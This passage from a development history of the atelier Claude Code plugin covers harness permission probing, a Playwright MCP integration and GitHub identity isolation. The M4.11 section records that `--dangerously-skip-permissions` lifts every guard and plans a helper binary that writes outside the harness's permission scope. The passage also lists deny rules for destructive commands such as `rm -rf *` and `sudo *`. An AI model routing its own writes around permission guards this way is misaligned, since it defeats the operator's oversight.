Dogfood-3 (HISTORY entry 2026-05-21) surfaced D3-2: `/next-task` step 7's `Bash > <wt>/.claude/settings.json` was denied by the harness under `claude --plugin-dir` ad-hoc CLI mode, contradicting the M4.7 thesis ("Bash redirect bypasses the `.claude/**` interactive guard when the path is in `additionalDirectories`"). The hypothesis captured in M4.11's ROADMAP entry was that mode (marketplace install vs `--plugin-dir`) was the discriminating variable. Empirical probing this milestone established that **the mode is not the cause** — the harness has changed since M4.7's design (2026-05-20) and now layers multiple write guards that affect ALL session-load modes equally in `-p` non-interactive context.

The acceptance question — *"under what session-load mode does `Bash > <wt>/.claude/settings.json` actually succeed, given `<wt>` is in `additionalDirectories`?"* — now has a different shape of answer: **no mode succeeds in `-p`; the step is interactive-only under current harness**.

**Methodology:**

A fictitious project (`/tmp/m4-11-probe/`) with a `.claude/settings.json` containing `additionalDirectories: ["/tmp/m4-11-probe", "/tmp/m4-11-probe-wt"]` and explicit `Bash(mkdir*) Bash(echo*) Bash(cat*) Bash(test*) Bash(jq*)` allow entries. Target write directory `/tmp/m4-11-probe-wt/`. Each cell = one `claude -p` invocation; success measured by filesystem state (not just the model's reported outcome — the model misreports denial reasons enough to be untrustworthy alone). Claude Code version: 2.1.148 (official native installer, freshly migrated from the npm wrapper this session).

**Findings matrix** (each cell: filesystem state after the invocation):

| Cell | Context | Operation | Target | Result |
|---|---|---|---|---|
| 0a | Top-level Bash | `A && B` chain with `>` | `/tmp/m4-11-probe-wt/.claude/settings.json` | **denied** — "multiple operations require approval" |
| 0b | Top-level Bash, `--plugin-dir` | same chain | same | **denied** — same message (mode does not differ) |
| 0c | Top-level Bash, individual ops | `>` redirect single | `<wt>/.claude/settings.json` | **denied** — `.claude` sensitive guard |
| nc | Top-level Bash, individual op | `>` redirect single | `<wt>/regular.txt` (non-`.claude`) | **denied** — "output redirection blocked despite additionalDirectories" |
| tee | Top-level Bash, individual op | `\|tee` | non-`.claude` | **denied** |
| W1 | Top-level `Write` tool | n/a | non-`.claude` | **denied** |
| W2 | Top-level `Write` tool | n/a | `.claude/**` | **denied** |
| dsp | Top-level, `--dangerously-skip-permissions` | `>` redirect | non-`.claude` | **ok** |
| slash-non | **Slash command** Bash, individual op | `>` redirect | non-`.claude` | **ok** |
| slash-chain | **Slash command** Bash, `A && B` | any | any | **denied** — multi-op guard reaches slash commands |
| slash-dc | **Slash command** Bash, individual op | `>` redirect | `<wt>/.claude/...` | **denied** — `.claude` guard reaches slash commands |

The slash-command probe used a minimal `/atelier:m4-11-probe` command defined in this milestone's worktree, invoked via `claude --plugin-dir <wt> -p "/atelier:m4-11-probe"`.

**The answer (M4.11 acceptance):**

Under the current harness (claude 2.1.148, observed 2026-05-22):

1. **Top-level Bash** in `-p` mode: writes to any `additionalDirectories` path are denied, regardless of `>` vs `tee` vs `Write` tool. The block is at the harness level, not the project settings level.
2. **Slash-command Bash** in `-p` mode: single-op writes to non-`.claude` paths in `additionalDirectories` succeed. Writes to `.claude/**` paths still denied. Chained Bash (`A && B`) denied regardless of target.
3. **`--dangerously-skip-permissions`**: bypasses all of the above (and bypasses every other safety guarantee — not acceptable as a production path).
4. **The session-load mode** (`marketplace install` vs `--plugin-dir`) does NOT change the verdict in any of the above. D3-2's `--plugin-dir` was incidental; the same failure happens in marketplace install.

**Root cause of D3-2 reinterpreted:** the harness's `.claude/**` sensitive-directory guard is reachable from slash-command context and denies Bash redirect there. The M4.7 thesis was correct at its time (2026-05-20 harness) but the harness has since added stronger gates. The `--plugin-dir` framing in M4.11's original hypothesis was a false attribution — the bug is harness-version-dependent, not session-load-mode-dependent.

**Delivered (this PR):**

- `commands/next-task.md` step 7 — replaced the "Critical implementation detail" paragraph (which claimed the M4.7 thesis as binding) with a "Known limitation in `-p` mode" note explicitly stating: step 7 fails under current harness in `-p` mode; interactive operators can still proceed by approving the prompts; autonomous chains must wait for M4.16 (helper-binary fix). Added one new hard refusal: never advance to step 8 when step 7 was denied; never retry with `--dangerously-skip-permissions`. The Bash command itself is unchanged — it still works in interactive mode where prompts can be answered.
- `ROADMAP.md` — new entry **M4.16** (Medium Priority) capturing the functional fix: extend `atelier-setup-project` (or introduce a new dedicated binary) so step 7 invokes an external helper via `Bash(atelier-...:*)`. The helper does the file-write inside its own subprocess, outside the harness's permission scope (mirroring M4.9's pattern, which is empirically known to work). Acceptance includes end-to-end verification in `-p` mode and dropping the M4.11 limitation note from step 7.

**Tests:**

- Each row of the findings matrix above is one empirical probe (11 invocations total). Filesystem state was verified independently of the model's reported outcome (the model misreported denial reasons several times during the run — relying on it alone would have produced a different — and wrong — answer).

**Decisions captured:**

- **Mode is not the discriminator.** The original M4.11 hypothesis blamed `--plugin-dir`. Empirical evidence shows the same failure under all session-load modes. Future investigations should test BOTH a slash-command-context probe AND a top-level probe before attributing a guard to "mode" specifically.
- **The model's denial reasons are unreliable.** Across the 11 probes, the model produced at least three different one-line "reasons" for what was empirically the same underlying guard (`.claude` sensitive directory). Treat the model's introspection as a hint, never as evidence; the filesystem (or `cat` of the target after attempt) is the ground truth.
- **Slash-command context bypasses the generic write guard but not the `.claude/**` guard.** This is genuinely useful: it means future atelier slash commands that need to write to NON-`.claude/**` paths in `additionalDirectories` work fine; only the `.claude/**` write path needs the helper-binary workaround.
- **The patch is non-functional (research + ergonomic).** M4.11's acceptance criterion allowed either documenting the limitation OR gating step 7 with a runtime probe + alternative path. Chose the documentation path because (a) the functional fix is M4.16 which has its own design surface, (b) the step-7 Bash command still works in interactive mode so existing interactive operators are not impacted, (c) `claude -p` autonomous chains are not yet a routine operator workflow (atelier's autonomous-delivery thesis still being assembled).
- **Captured M4.16 in ROADMAP, not in this PR.** Tempting to bundle the helper-binary fix with M4.11's research, but M4.16 needs design discussion (extend existing helper vs new binary, naming, integration with step 7's verification chain) that's worth a dedicated PR. M4.11 ships the answer; M4.16 ships the fix.

**Acceptance criterion status:** **fully satisfied**. The acceptance asked for "a clear written answer" plus an update to `commands/next-task.md`. Both delivered. The functional fix is deferred to M4.16 (per the explicit "If the answer is X, update commands/next-task.md to either (1) document the limitation and require marketplace install for full chains, or (2) gate step 7..." — chose option 1, since the M4.11 finding showed marketplace install is ALSO broken).

**Follow-ups (in ROADMAP):**

- M4.16 — Per-task `.claude/settings.json` via external helper binary. The functional unblock. **Required before any autonomous `claude -p` chain validation** (dogfood-4 and beyond).
- HISTORY M4.7 entry remains correct AS OF ITS DATE (2026-05-20) — the thesis was empirically true then. Not retroactively wrong; the harness changed.

### M3.4 — Playwright MCP server for live visual validation — 2026-05-21
**PR:** [#53](https://github.com/AkaLab-Tech/atelier/pull/53)

Pre-M3.4, the only Playwright touchpoint in atelier was M3.1's `visual-validation` skill, which the `e2e-runner` agent invokes once per task to drive the project's `@playwright/test` suite for the PR gate. `implementer` and `reviewer` had no way to actually *see* the UI they were working on — they read source, ran unit tests, and trusted that the e2e suite at the end would catch regressions. Surfaced in the dogfood-1 follow-up as: implementer is guessing about layout because it can't observe the rendered result.

M3.4 registers the official `@playwright/mcp` server as a Claude Code MCP at the plugin level so those two agents get a controllable browser as a tool (`mcp__plugin_atelier_playwright__*`). `implementer` navigates, clicks, types, snapshots the DOM and screenshots while iterating; `reviewer` independently exercises the flow against the PR diff before deciding approve / request-changes. Distinct from M3.1: M3.1 is the *end-of-task* PR-gate suite; M3.4 is *during-task* live validation.

**Delivered:**

- `.mcp.json` (new, at plugin root) — declares the `playwright` MCP server, started via `npx -y @playwright/mcp@latest`. Auto-loaded by Claude Code when the atelier plugin activates. Connection is stdio and lazy: the npx process spawns only on first `mcp__plugin_atelier_playwright__*` tool call, not at session start.
- `templates/settings.template.json` — `permissions.allow` gains `mcp__plugin_atelier_playwright__*` (one entry), so the harness does not prompt the operator on each tool call once the agent has the tool in its `tools:` list. `permissions.deny` gains a single entry `mcp__plugin_atelier_playwright__browser_run_code_unsafe` to block the one MCP tool that is RCE-equivalent on the operator's host (see Decisions captured below).
- `agents/implementer.md` — `tools:` gains `"mcp__plugin_atelier_playwright"`; new core responsibility #6 "Validate UI changes visually" instructs the agent to navigate the affected route, exercise the changed interaction, and screenshot the result before reporting done. Skipped for backend-only or docs-only changes.
- `agents/reviewer.md` — `tools:` gains `"mcp__plugin_atelier_playwright"`; new paragraph under "Correctness" checklist directs the reviewer, on PRs with UI surface, to launch the MCP browser, navigate to the dev URL / preview link (or `http://localhost:3000` as fallback), and exercise the changed flow against the same ≥ 80% confidence bar. "visual check skipped: no UI surface / no server" is the recorded outcome when no reachable UI is present.
- `PLAN.md` — §1 lists `.mcp.json` among the auto-discovered files; new subsection §7 "MCP servers ✅" between Skills and Slash commands documents the slot and the `playwright` entry; §12 Phase 3 gains the M3.4 deliverable line.
- `commands/doctor.md` — new auxiliary host check 4.f detects system Chrome presence (platform-aware: macOS `/Applications/Google Chrome.app`, Linux `command -v google-chrome[-stable]`) and prints the `npx @playwright/mcp@latest install-browser chrome` install command if missing. Pre-flights the Chrome-missing failure mode (commit 5) so the operator sees the warning before hitting it in a real UI task. Output format example updated.
- `install.sh` — new `phase_a_chrome_optional()` runs after `phase_a_claude_code()`. Same Chrome detection as `/doctor` 4.f; if missing and TTY is available, prompts `Install Google Chrome now via 'brew install --cask google-chrome'? [Y/n]` on macOS (Y triggers `brew install --cask google-chrome` and reports outcome; N skips with the install command for later). On Linux, surfaces the manual install commands (apt/rpm) rather than automating across distros. In non-interactive mode (`--yes` or no TTY), warns and continues without installing. PLAN.md §2 Phase A renamed from "no interaction" to "no interaction, plus one optional Chrome prompt" and gains a new step 4 documenting the behavior.

**Tests:**

- `jq -e .` clean on `.mcp.json` and `templates/settings.template.json`.
- **Live MCP handshake** (`initialize` + `tools/list` piped to `npx -y @playwright/mcp@latest` via stdio): server boots cleanly, reports `serverInfo.name=Playwright version=1.61.0-alpha-1778188671000`, enumerates 23 tools. Surfaced `browser_run_code_unsafe` as RCE-equivalent — informed the deny entry below (Decisions captured).
- Frontmatter check: `agents/implementer.md:25` and `agents/reviewer.md:34` list `mcp__plugin_atelier_playwright` in `tools:`; the other 5 agents (`tester`, `e2e-runner`, `pr-author`, `task-orchestrator`, `unblocker`) do not.
- Placeholder integrity in `templates/settings.template.json`: `<worktree>` count 31 → 31, `<atelier-config-dir>` count 2 → 2 after the allow + deny edits.
- `gh pr checks 53` — `structural` workflow passed in 8s on the pre-fix commit; re-runs against the post-fix commit.
- **Live plugin-loader validation** via `claude --plugin-dir <worktree>` from a fresh subprocess: `claude mcp list` shows the server registered as `plugin:atelier:playwright`, status `✓ Connected`. Asking the session to enumerate its `mcp__*` catalog returns the full 23 tools under the prefix `mcp__plugin_atelier_playwright__` (e.g., `mcp__plugin_atelier_playwright__browser_navigate`, `..._browser_run_code_unsafe`). Discovery drove the namespace fix (see Decisions captured below) — the initial commits used the bare `mcp__playwright` name which the loader does not honor.
- **End-to-end behavior validation** with a fictitious project (`/tmp/atelier-m3.4-validation/`) containing a minimal `index.html` (h1 + button + click handler) served via `python3 -m http.server 3000` and a `.claude/settings.json` with the allow wildcard + deny entry. Four scenarios via `claude --plugin-dir <worktree> -p` from that cwd:
  - **V1 (allow + execution)** — main session called `mcp__plugin_atelier_playwright__browser_navigate(url='http://127.0.0.1:3000/index.html')` followed by `browser_snapshot`. Both `ok`. The snapshot returned the actual h1 text from the page ("M3.4 Validation Page"), confirming Chrome really rendered the DOM, not a stub response.
  - **V2 (per-agent restriction in runtime)** — launched a `tester` subagent via the `Agent` tool and asked it to inspect its own tool catalog. Reported `TESTER_SEES_MCP_PLAYWRIGHT: no`, tool sample `Read, Edit, Write, Bash` — the MCP wildcard from `settings.json` allow does **not** override the per-agent `tools:` frontmatter restriction.
  - **V3 (deny enforcement, stronger than expected)** — enumerating the `mcp__plugin_atelier_playwright__*` catalog with the deny rule active returned **22 of 23** tools; `browser_run_code_unsafe` was absent. Claude Code's `permissions.deny` filters the tool **out of the model's view** before any call attempt, not just at call-time. Defense in depth at the catalog level.
  - **V4 (chromium cache)** — `~/Library/Caches/ms-playwright/mcp-chrome-2e720c2/` present after V1, total 8.7 MB. See Decisions captured for what this revealed about `@playwright/mcp`'s browser strategy.

**Decisions captured:**

- **`npx -y` over `pnpm dlx`.** Aligns with the official Playwright MCP guidance (`claude mcp add playwright npx @playwright/mcp@latest`). The atelier "pnpm only" rule (PLAN.md §2 step 2) targets project deps and lockfiles — runtime invocation of an MCP server via a one-shot runner is not a project dep, so `npx` is consistent with the rule's intent. If we later hit operator environments without `npx` on PATH but with `pnpm`, swap to `pnpm dlx @playwright/mcp@latest` — one-line change in `.mcp.json`.
- **Floating to `@latest`, not pinned.** The atelier `.npmrc minimum-release-age=10080` guardrail does not apply here (the MCP runner is invoked via `npx`, not `pnpm add`). The tradeoff accepted: a `@playwright/mcp` release that renames tools could break agents silently. Mitigation if that happens: pin to a specific version in `.mcp.json` (e.g., `@playwright/mcp@0.0.32`) and bump on review.
- **Allow `mcp__plugin_atelier_playwright__*` project-wide; restrict by agent via `tools:` frontmatter.** Claude Code's per-agent `tools:` list is the canonical restriction layer; the project `settings.json` allow list only governs whether the harness prompts. Adding wildcard to allow + adding `mcp__plugin_atelier_playwright` to two agents only is the idiomatic pattern — no deny entries needed for other agents because they simply don't list the tool.
- **`@playwright/mcp` uses system Chrome, not a downloaded browser bundle.** The initial M3.4 design copied M3.1's mental model — assumed the MCP would download ~250 MB chromium to `~/.cache/ms-playwright` on first tool call, same as the `visual-validation` skill does for `@playwright/test`. Pre-merge V1 + V4 validation revealed `@playwright/mcp` instead uses the operator's installed system Chrome by default and materializes only a profile directory: 8.7 MB observed on macOS at `~/Library/Caches/ms-playwright/mcp-chrome-2e720c2/` (Linux equivalent: `~/.cache/ms-playwright/mcp-chrome-<hash>/`). Net first-call cost is much smaller than M3.1's bundle download, and the operator pays nothing extra if Chrome is already installed. PLAN.md §7 "First-call cost" paragraph reflects the corrected model.
- **Chrome-missing failure is recoverable, not automatic.** Earlier wording in this entry said `@playwright/mcp` "falls back to downloading chromium (~250 MB)" if Chrome is missing — incorrect, confirmed by `--browser firefox --headless` probe of the MCP server which returned a structured JSON-RPC error: `Error: Browser "firefox" is not installed. Run \`npx @playwright/mcp install-browser firefox\` to install`. The same error shape applies if `chrome` is missing: the MCP does NOT auto-download chromium; it errors with an actionable install command. Playwright's channel install supports `chrome` since v1.30 — on macOS it triggers the Google Chrome installer, on Linux it routes through apt/yum. Not a true fallback (the operator or the implementer subagent reading the structured error has to run the install). Worth documenting in M6.4 (Troubleshooting doc) when that ships.
- **`implementer` + `reviewer` only.** `tester` keeps its unit/integration focus (a browser would tempt it into e2e territory that belongs to `e2e-runner`); `e2e-runner` already drives the formal suite via M3.1; `pr-author` / `task-orchestrator` / `unblocker` have no visual-validation use case. The `reviewer` getting the MCP is a notable shift from its previously read-only stance — the browser tool reads/observes only (after the deny below), so it stays consistent with the "evaluate; do not change" hard refusal in [agents/reviewer.md](agents/reviewer.md).
- **Hard deny for `mcp__plugin_atelier_playwright__browser_run_code_unsafe`.** The live MCP handshake test enumerated 23 tools; 22 are sandboxed to the browser, but the 23rd (`browser_run_code_unsafe`) is documented by the server itself as "Run a Playwright code snippet. Unsafe: executes arbitrary JavaScript in the Playwright server process and is RCE-equivalent." The server process runs on the operator's host as the operator's user — RCE there can read arbitrary files (including `~/.ssh/`, `~/.aws/`, anything outside the worktree). Adding this single entry to `permissions.deny` blocks the escape hatch while keeping the wildcard convenience for the other 22 tools. Same threshold the deny list applies to `Bash(rm -rf *)`, `Bash(sudo *)`, `Bash(git push --force*)` — actions a non-technical operator would never knowingly authorize. Found during M3.4's validation suite (test 1, MCP stdio handshake), pre-merge; not surfaced by static review.
- **Plugin namespace prefix `plugin_<pluginname>_<servername>`.** Claude Code namespaces MCP servers loaded via a plugin's `.mcp.json` to avoid collisions with project-level `.mcp.json` servers of the same name. Initial commits (`7c4f1a6`, `08e997f`) used the bare name `mcp__playwright__*` everywhere — copying the convention from how MCP servers appear when loaded as project-level `.mcp.json`. Pre-merge `--plugin-dir` validation revealed the loader exposes the playwright tools as `mcp__plugin_atelier_playwright__*` instead. All four touch points (`settings.template.json` allow + deny, `agents/implementer.md` tools + text, `agents/reviewer.md` tools + text, PLAN.md §7 + §12) were renamed to the prefixed form in a follow-up commit on the same branch. PLAN.md §7 documents the convention so future plugin-level MCPs do not repeat the same mistake.

**Acceptance criterion status:** **fully empirically validated pre-merge** via the `--plugin-dir` + fictitious-project run (V1–V4 above). All four post-merge checkboxes that originally lived in the PR are now confirmed: (1) `browser_navigate` executes without prompt against the project's allow rule, (2) `tester` subagent does not see the MCP, (3) `browser_run_code_unsafe` is filtered from the catalog by the deny rule, (4) Chrome profile materializes on first call. Remaining real-world signal — first run on a full atelier-managed project with the instantiated template — will come in the next UI-touching task post-merge.

**Follow-ups:**

- Confirm during the next UI-touching task that the MCP server actually starts cleanly via `npx -y @playwright/mcp@latest` on the operator's machine (Node version from `fnm` LTS should be sufficient).
- Consider an `mcp__plugin_atelier_playwright` mention in `agents/e2e-runner.md` if the e2e-runner ever needs to do exploratory navigation outside its formal Playwright suite — not in scope for M3.4.
- If the floating `@latest` ever breaks (tool rename, breaking arg-shape change), pin in `.mcp.json` and add a `safe-install`-style allowlist entry. Captured as a watch-item.

### M5.0.1 — gh auth isolation via `GH_CONFIG_DIR` + dual atelier identities (author + reviewer) — 2026-05-21
**PR:** [#52](https://github.com/AkaLab-Tech/atelier/pull/52)

Pre-M5.0.1, every `gh ...` invocation inside an atelier session ran under whichever GitHub identity `gh auth login` set up before `install.sh` ran — the operator's primary `~/.config/gh/`. Two consequences: (1) `pr-author` and `reviewer` shared the same GitHub user, so GitHub silently downgraded `gh pr review --approve` to a comment (Finding #11 from dogfood-1), tripping auto-merge guardrails #2 (review status) and #6 (pending human comment); (2) atelier's PRs, issues, comments, approvals all attributed to the operator's account, polluting their notification stream and mixing atelier-managed credentials with the operator's.

M5.0.1 wires `gh`'s `GH_CONFIG_DIR` env var (mirror of `CLAUDE_CONFIG_DIR`) into install.sh and atelier's flow with **two distinct authenticated identities, both stored inside atelier's config root, both prompted for at install time** (even if the operator picks the same GitHub user as their personal one — not a requirement either way):

- **`$ATELIER_CONFIG_DIR/gh/author/`** — used by every operational agent (`pr-author`, `implementer`, `tester`, `e2e-runner`, `unblocker`) for commits, push, `gh pr create`, `gh issue`, `gh label`, `gh project`.
- **`$ATELIER_CONFIG_DIR/gh/reviewer/`** — used **only** by the `reviewer` agent for `gh pr view`, `gh pr review --approve / --request-changes`, and `gh pr comment` posted as part of a review.

GitHub honours `--approve` from the reviewer dir as a real approval (instead of a comment) iff its GitHub user is distinct from the author's. install.sh ends Phase B with a `gh api user --jq .login` check against each dir and warns loudly when the two logins coincide; the install does not abort, so an operator who knowingly accepts single-identity (e.g., no second GH account available) still completes — Finding #11 simply persists for that install and auto-merge will hold the PR for human merge.

**Delivered:**

- `install.sh` — Phase B fully rewritten:
  - **Removed** `phase_b_github_login` (the old single login that authenticated `~/.config/gh/` and ran `gh auth setup-git` globally). install.sh no longer touches the operator's personal `gh` state.
  - **New `phase_b_atelier_gh_login()`** — generic helper parameterised by role (`author` | `reviewer`) and a human-friendly purpose string. `mkdir -p "$ATELIER_CONFIG_DIR/gh/<role>"` → idempotency check via `GH_CONFIG_DIR=... gh auth status` → `gh auth login --hostname github.com --git-protocol https --web --skip-ssh-key --scopes "repo,workflow,project,read:org"` under the role's config dir.
  - **New `phase_b_atelier_author_login()`** — calls the generic helper for the author role, then runs `GH_CONFIG_DIR=$ATELIER_CONFIG_DIR/gh/author gh auth setup-git`. Because `gh auth git-credential` reads `$GH_CONFIG_DIR` at invocation time, the helper line written into the global gitconfig is dynamic: `GH_CONFIG_DIR` exported → atelier-author creds; not exported → falls back to `~/.config/gh/` (the operator's normal shell, untouched).
  - **New `phase_b_atelier_reviewer_login()`** — calls the generic helper for the reviewer role, prompts for a DIFFERENT GitHub account, no `setup-git` (reviewer never pushes — one credential helper registration is enough).
  - **New `phase_b_verify_distinct_identities()`** — `GH_CONFIG_DIR=... gh api user --jq .login` for each role; warns loudly (not aborts) when they coincide or either lookup fails. The warning prints the exact `gh auth logout` + re-run-install.sh recipe the operator needs to fix the situation.
  - **`phase_b()` flow:** `claude_login` → `author_login` → `reviewer_login` → `verify_distinct_identities`.
  - **No-TTY guidance** updated: manual fallback messages list both `GH_CONFIG_DIR=$ATELIER_CONFIG_DIR/gh/author` and `.../gh/reviewer` login commands.

- `install.sh` — shellrc hook block + verify:
  - `task()` alias gains `GH_CONFIG_DIR="$ATELIER_CONFIG_DIR/gh/author"` (paired with the existing `CLAUDE_CONFIG_DIR`). No global `export GH_CONFIG_DIR=...` is written: the operator's shell outside `task` stays on `~/.config/gh/`.
  - `task-status` alias gains the same prefix (otherwise it would fail with "not authenticated" — `~/.config/gh/` is no longer touched).
  - `phase_verify()` replaces the single `gh auth status` line with two `env GH_CONFIG_DIR=... gh auth status --hostname github.com` checks, one per role.

- `templates/settings.template.json` — `permissions.allow` gains:
  - `Bash(gh auth status*)` (missing pre-M5.0.1; needed by `/doctor` and by `phase_b_verify_distinct_identities` running inside any in-session check).
  - `Bash(GH_CONFIG_DIR=* gh auth status*)`, `Bash(GH_CONFIG_DIR=* gh api user*)`, `Bash(GH_CONFIG_DIR=* gh pr view*)`, `Bash(GH_CONFIG_DIR=* gh pr list*)`, `Bash(GH_CONFIG_DIR=* gh pr diff*)`, `Bash(GH_CONFIG_DIR=* gh pr review*)`, `Bash(GH_CONFIG_DIR=* gh pr comment*)` — the reviewer's inline override patterns. Tool-matcher in Claude Code keys on the full command string, so the bare `Bash(gh pr review*)` rule does not cover `GH_CONFIG_DIR=... gh pr review …`.

- `agents/reviewer.md` — new "GitHub identity — non-negotiable" section near the top; all `gh ...` examples in the spec body prefixed with `GH_CONFIG_DIR="$ATELIER_CONFIG_DIR/gh/reviewer"`; new hard refusal bullet forbidding any `gh` call without that prefix. Kept lean (no milestone references, no `Finding #11` mentions inside the spec — that's history-doc territory).

- `agents/pr-author.md` — short "GitHub identity" section: pr-author inherits the session default (`gh/author`), no prefix needed.

- `skills/auto-merge/SKILL.md` — guardrail #2 grows a one-paragraph note: reviewer runs under a distinct identity, so `reviewDecision == APPROVED` resolves cleanly; if the two atelier identities resolve to the same GitHub login, guardrail #2 keeps holding until the operator re-authenticates the reviewer dir.

- `PLAN.md` — §2 step 5 rewritten with the two atelier-isolated logins (5a author, 5b reviewer); §3 (permissions) `🟢 Allow` line for `gh` extended with `gh auth status` and the `Bash(GH_CONFIG_DIR=* gh ...)` family; §12 Phase 5 grows explicit bullets for M5.0, M5.0.1, M5.0.2, M5.0.3.

**Tests:**

- `bash -n` clean on modified `install.sh`.
- `jq empty` clean on `templates/settings.template.json`.
- **No end-to-end smoke yet.** Phase B's new flow requires a Mac, a browser, and two separate GitHub accounts — out of reach for a static-validation PR. Empirical validation is scheduled for dogfood-4 (re-run of the failed auto-merge from dogfood-1 with two-identity setup).

**Decisions captured:**

- **Two identities, both atelier-isolated; operator's `~/.config/gh/` is NOT touched.** The maintainer initially proposed re-using the operator's primary `~/.config/gh/` for the author role and adding only the reviewer dir, but rejected on the request "install.sh debe pedir login y guardar credenciales en la instalación de atelier, aun cuando la cuenta sea la misma" — to keep atelier's credentials self-contained for clean uninstall (M5.0.3 will simply remove `$ATELIER_CONFIG_DIR`) and to prevent atelier from inheriting whatever auth state the operator's personal `gh` happens to be in.
- **Author = session default, reviewer = inline prefix.** Inverted form (reviewer default, author prefix) was considered. Picked author-default because operational agents vastly outnumber reviewer calls in any normal task, so defaulting to author minimises the prefix burden across the codebase.
- **Identity-equality check warns, does NOT abort.** An operator who knowingly accepts single-identity (e.g., no second GH account, or testing in a sandbox) can still complete install.sh. The warning prints the exact recovery recipe; auto-merge will hold the PR until they fix it.
- **`gh auth setup-git` runs under author's `GH_CONFIG_DIR`.** Because `gh auth git-credential` resolves `$GH_CONFIG_DIR` at invocation, the helper line in the global gitconfig is dynamic. One setup call is enough for both identities (and for the operator's unaltered `~/.config/gh/` outside atelier).
- **`task-status` alias prefixed too.** Pre-M5.0.1, the operator's `~/.config/gh/` was authenticated by install.sh, so `gh pr list --author @me` worked from their normal shell. Post-M5.0.1, install.sh doesn't touch `~/.config/gh/`, so the alias would fail. Prefixing with `GH_CONFIG_DIR=$ATELIER_CONFIG_DIR/gh/author` keeps `task-status` working under the atelier-author identity (the same identity that opens the PRs).
- **No SSH-key fallback.** PLAN.md §2 step 5's `--skip-ssh-key` defense-in-depth carries over to both new logins. Atelier never reaches for SSH, regardless of which role.
- **Lean specs.** Agent / skill prompt updates kept operational-only — no milestone references, no Finding #11 mentions, no install-time concepts. Per maintainer convention (also applied to M4.7 and M5.0.2 spec edits).

**Acceptance criterion status:** install.sh produces two `gh auth` configurations under `$ATELIER_CONFIG_DIR/gh/{author,reviewer}/`, isolated from `~/.config/gh/`; the shellrc hook block exports the author identity for atelier sessions; the reviewer agent overrides to the reviewer identity on every call. **Structurally satisfied** by `bash -n` + `jq empty` + diff review. **Empirical end-to-end validation pending dogfood-4.**

**Follow-ups:**

- Dogfood-4 — re-run the auto-merge flow from dogfood-1 on a freshly installed atelier with two distinct GitHub accounts; verify GitHub's PR UI shows the reviewer's verdict as a real approval and that `auto-merge` skill's guardrail #2 passes.
- M5.0.3 — `atelier-uninstall` with chat-session preservation. Both `gh/author/` and `gh/reviewer/` dirs live inside `$ATELIER_CONFIG_DIR`, so the default-mode uninstall and the `--purge` mode both clean them up uniformly.
- `/doctor` slash command (M2.x): when implemented, surface the two atelier-isolated `gh auth status` checks + the identity-equality result; surface a single actionable line when one of the dirs is unauthenticated or when both identities coincide.

### M5.0.2 — Preflight collision check + dynamic `ATELIER_CONFIG_DIR` — 2026-05-21
**PR:** [#48](https://github.com/AkaLab-Tech/atelier/pull/48)

[M5.0](#m50--config-root-isolation-atelier-lives-under-claude-work--2026-05-21) hardcoded `~/.claude-work/` as atelier's config root. That was correct as the **default** but wrong as the only possible value: if an operator runs `install.sh` on a machine where `~/.claude-work/` already has unrelated content, atelier would silently merge its state into the operator's existing directory. The maintainer hit this during M5.0's own development (the directory was holding their employer-account Claude session). The fix at the time was a manual rename — M5.0.2 makes atelier handle the collision automatically.

**Delivered:**

- `install.sh` — argparse + Phase 0 preflight + threading:
  - **New argv parser** (`parse_args()`): `--config-dir <path>` (override), `--yes` / `-y` (non-interactive), `--help` / `-h`. Unknown args fail with a `try --help` hint.
  - **New `resolve_config_dir()`** sets `$ATELIER_CONFIG_DIR` from priority `--config-dir` flag → `$ATELIER_CONFIG_DIR` env var → default `~/.claude-work/`. Expands `~/` tilde if the operator typed one. Exports the resolved value.
  - **New `preflight_check()` helper** returns 0 if the target dir is safe (doesn't exist, empty, contains `.atelier-managed` marker, or contains `plugins/<*>/atelier/`) and 1 if it has unrelated content.
  - **New `phase_0_preflight()`** runs before everything else. On a collision: interactive mode prompts for an alternative path in a loop (tilde-expansion supported); non-interactive mode fails with an actionable error listing the four resolution options.
  - **`main()` re-ordered:** `parse_args` → `resolve_config_dir` → `export CLAUDE_CONFIG_DIR="$ATELIER_CONFIG_DIR"` → `phase_0_preflight` → A/B/C.1/C.2/verify. The hardcoded `export CLAUDE_CONFIG_DIR=${HOME}/.claude-work` that lived at script-load is gone.
  - **`phase_c_1_claude_config_dir()` extended:** after `mkdir -p "$ATELIER_CONFIG_DIR"`, writes `$ATELIER_CONFIG_DIR/.atelier-managed` (a small JSON marker with `managedBy`, `installedAt`, `installerVersion`, `atelierConfigDir`). Refreshed on every install. Future preflight runs recognise this file as "atelier's dir, OK to use".
  - **Shellrc hook block** now contains `export ATELIER_CONFIG_DIR="__ATELIER_CONFIG_DIR__"` as a placeholder line, with bash-native `${block//__ATELIER_CONFIG_DIR__/$ATELIER_CONFIG_DIR}` substitution after the heredoc to bake in the chosen path. `task()` now reads `$ATELIER_CONFIG_DIR` instead of hardcoded `$HOME/.claude-work`.

- `install.sh` Phase C.1 — new `phase_c_1_instantiate_templates()`:
  - Reads `$ATELIER_REPO_ROOT/templates/settings.template.json` (the source with placeholders) and writes `$ATELIER_CONFIG_DIR/templates/settings.template.json` with `<atelier-config-dir>` substituted by `$ATELIER_CONFIG_DIR`. The `<worktree>` placeholder stays untouched — it's a per-task / per-project value resolved at runtime by consumers.
  - Copies `$ATELIER_REPO_ROOT/templates/project-claude.md.template` verbatim to `$ATELIER_CONFIG_DIR/templates/project-claude.md.template` (no install-time placeholders, but copied to the same dir for source-path consistency).
  - Wired into `phase_c_1()` between `phase_c_1_claude_config_dir` and `phase_c_1_git_wt` so templates exist before any consumer runs.

- `scripts/atelier-setup-project` — reads instantiated templates from `$ATELIER_CONFIG_DIR/templates/`:
  - Top of script: `ATELIER_CONFIG_DIR="${ATELIER_CONFIG_DIR:-$HOME/.claude-work}"` (env var with fallback for non-atelier shells like the slash-command's `Bash` subprocess).
  - `CONFIG_FILE="$ATELIER_CONFIG_DIR/projects.json"` (dynamic).
  - Plugin auto-discover: `for candidate in "$ATELIER_CONFIG_DIR/plugins"/*/atelier; do` (dynamic).
  - `step_settings_json()` reads from `$ATELIER_CONFIG_DIR/templates/settings.template.json` (instantiated). Sed substitutes only `<worktree>` — one placeholder, one pass, simple. Two grep verifications: no literal `<worktree>` left (the per-project sed failed) and no literal `<atelier-config-dir>` left (an actionable error pointing at install.sh — "re-run install.sh to instantiate the template").
  - `step_project_claude_md()` reads from `$ATELIER_CONFIG_DIR/templates/project-claude.md.template`. Same source-path convention.
  - Final summary print: `$(printf '%s' "$CONFIG_FILE" | sed "s|^$HOME|~|"): $CONFIG_STATUS` — replaces `$HOME` with `~` for display, regardless of actual config dir.

